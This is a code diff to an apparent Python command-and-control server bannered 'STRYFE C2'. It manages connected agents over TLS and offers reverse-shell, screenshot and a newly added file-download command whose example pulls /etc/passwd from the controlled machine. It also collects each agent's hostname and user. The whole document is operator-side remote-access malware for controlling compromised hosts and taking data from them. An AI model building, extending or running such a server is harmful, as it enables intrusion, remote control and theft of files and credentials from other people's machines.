@@ -2,6 +2,8 @@ import socket
 import threading
 import ssl
 import secrets
+import os
+import json
 
 class Agent:
     def __init__(self, conn, sock, id):
@@ -9,11 +11,14 @@ class Agent:
         self.port = conn[1]
         self.sock = sock
         self.id = id
+        self.hostname = None
+        self.user = None
 
     def __str__(self):
         return f"[{self.id}] Agent: {self.ip}:{self.port}"
 
 class Server:
+                                                                      
     def __init__(self, address, port):
         self.address = address
         self.port = port
@@ -22,35 +27,47 @@ class Server:
         self.current_id = 1
         self.server_stop = False
         self.current_session = 0
+        self.banner = """
+                        ███████╗████████╗██████╗ ██╗   ██╗███████╗███████╗     ██████╗██████╗ 
+                        ██╔════╝╚══██╔══╝██╔══██╗╚██╗ ██╔╝██╔════╝██╔════╝    ██╔════╝╚════██╗
+                        ███████╗   ██║   ██████╔╝ ╚████╔╝ █████╗  █████╗      ██║      █████╔╝
+                        ╚════██║   ██║   ██╔══██╗  ╚██╔╝  ██╔══╝  ██╔══╝      ██║     ██╔═══╝ 
+                        ███████║   ██║   ██║  ██║   ██║   ██║     ███████╗    ╚██████╗███████╗
+                        ╚══════╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝     ╚═════╝╚══════╝
+"""
 
         self.commands = {
             'exit': {
                 'function': self.exit,
-                'description': 'Exit the server.'
+                'description': 'Exit the server'
             },
             'agents': {
                 'function': self.displayAgents,
-                'description': 'List all connected agents.'
+                'description': 'List all connected agents'
             },
             'agent': {
-                'function': self.agent,
+                'function': self.selectAgent,
                 'description': 'Select an agent by ID | ID: Integer | Ex: agent 3'
             },
             'shell': {
                 'function': self.shell,
-                'description': 'Open a reverse shell from the selected agent.'
+                'description': 'Open a reverse shell from the selected agent'
             },
             'screenshot': {
                 'function': self.screenshot,
-                'description': 'Take a screenshot from the selected agent.'
+                'description': 'Take a screenshot from the selected agent'
+            },
+            'download': {
+                'function': self.download,
+                'description': 'Download the specified file | FILE: String | Ex: download /etc/passwd'
             },
             'bg': {
                 'function': self.bg,
-                'description': 'Deselect the current agent.'
+                'description': 'Deselect the current agent'
             },
             'help': {
                 'function': self.help,
-                'description': 'Show this help message.'
+                'description': 'Show this help message'
             }
         }
 
@@ -71,7 +88,10 @@ class Server:
         print("  command [args]\n")
 
     def handleClient(self, agent):
-        agent.sock.sendall("Welcome agent\n".encode())
+        json_string = agent.sock.recv(4096).decode()
+        json_object = json.loads(json_string)
+        agent.hostname = json_object['hostname']
+        agent.user = json_object['user']
 
     def acceptConnections(self):
         while not self.server_stop:
@@ -86,12 +106,12 @@ class Server:
     def start(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.bind((self.address, self.port))
-        print(self)
         self.sock.listen(5)
         
         self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
         self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")
-        
+
+        print(self.banner)
         threading.Thread(target=self.acceptConnections).start()
 
     def main_loop(self):
@@ -101,6 +121,7 @@ class Server:
 
             if command:
                 command_name, *args = command.split(' ')
+                command_name = command_name.lower()
                 if command_name in self.commands:
                     self.commands[command_name]['function'](' '.join(args))
                 else:
@@ -114,20 +135,21 @@ class Server:
 
     def displayAgents(self, args):
         if self.agents:
-            print("\nConnected Agents:")
-            print("=" * 50)
-            print(f"{'ID':<5}{'IP Address':<20}{'Port':<10}")
-            print("-" * 50)
+            print("")
+            print("=" * 90)
+            print(f"{'ID':<5}{'IP Address':<20}{'Port':<10}{'User':<15}{'Hostname':<30}")
+            print("-" * 90)
             for agent in self.agents:
-                print(f"{agent.id:<5}{agent.ip:<20}{agent.port:<10}")
-            print("=" * 50)
+                print(f"{agent.id:<5}{agent.ip:<20}{agent.port:<10}{agent.user:<15}{agent.hostname:<30}")
+            print("=" * 90)
+            print("")
         else:
             print("No agents connected")
 
-    def agent(self, args):
+    def selectAgent(self, args):
         try:
             if int(args) > len(self.agents):
-                print("Invalid agent ID")
+                print(f"No agent with ID {int(args)}")
             else:
                 self.current_session = int(args)
         except ValueError:
@@ -142,6 +164,7 @@ class Server:
                 if command == '':
                     continue
                 if command.lower() == 'exit':
+                    agent.sock.sendall("exit".encode())
                     break
                 agent.sock.sendall(command.encode())
                 print(agent.sock.recv(8192).decode('latin1'))
@@ -154,10 +177,32 @@ class Server:
             with open(screen_path, 'wb') as f:
                 while True:
                     data = agent.sock.recv(1024)
-                    if data.decode("latin1") == "EOF":
+                    if (data.decode("latin1") == "EOF") or (not data):
                         break
                     f.write(data)
-            print(f'Image received and saved at {screen_path}')
+            print(f'Screenshot saved at {screen_path}')
+        else:
+            print("Please select an agent")
+    
+    def download(self, args):
+        if self.current_session > 0:
+            agent = self.agents[self.current_session - 1]
+            agent.sock.sendall(f"download {args}".encode())
+            args = args.split(" ")
+            for file_path in args:
+                file = os.path.basename(file_path)
+                with open(file, 'w+b') as f:
+                    while True:
+                        data = agent.sock.recv(1024)
+                        decoded_data = data.decode("latin1")
+                        if (decoded_data == "EOF") or (not data):
+                            break
+                        if (decoded_data.startswith("ERROR:")):
+                            print(decoded_data)
+                            os.remove(file)
+                            return
+                        f.write(data)
+                print(f'File saved at {os.getcwd()}/{file_path}')
         else:
             print("Please select an agent")
 
@@ -172,6 +217,9 @@ class Server:
         agent_id = self.current_id
         self.current_id += 1
         agent = Agent(client_address, client_socket, agent_id)
-        print(f"New connection:\n{agent}")
+        print(f"\nNew connection:\n{agent}")
         self.addAgent(agent)
         return agent
+    
+    def deleteAgent(self, id):
+        pass
